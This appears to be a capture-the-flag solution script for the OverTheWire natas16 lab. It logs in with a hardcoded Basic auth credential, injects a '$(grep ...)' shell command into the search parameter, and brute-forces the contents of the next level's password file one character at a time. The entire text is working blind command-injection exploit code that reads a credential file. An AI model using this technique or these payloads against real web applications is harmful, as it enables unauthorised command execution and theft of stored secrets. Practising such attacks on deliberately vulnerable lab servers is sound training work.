import urllib2
import time
import sys

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
headers={'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
request = urllib2.Request('http://natas16.natas.labs.overthewire.org', headers=headers)
response = urllib2.urlopen(request)
response.close()

found = '' if len(sys.argv) == 1 else sys.argv[1]
for i in range(len(found), 32):
    for j in range(len(chars)):
        attempt = found + chars[j]
        query = '$(grep+-e+^' + attempt + '.*+%2Fetc%2Fnatas_webpass%2Fnatas17)hacker'
        url = "http://natas16.natas.labs.overthewire.org/?needle=" + query + "&submit=Search"
        request = urllib2.Request(url, headers=headers)
        response = urllib2.urlopen(request)
        result = response.read()
        if 'hacker' not in result:
            found = attempt
            break
        response.close()
        time.sleep(0.2)
        sys.stdout.write('.')
        sys.stdout.flush()
    print('\n' + found)
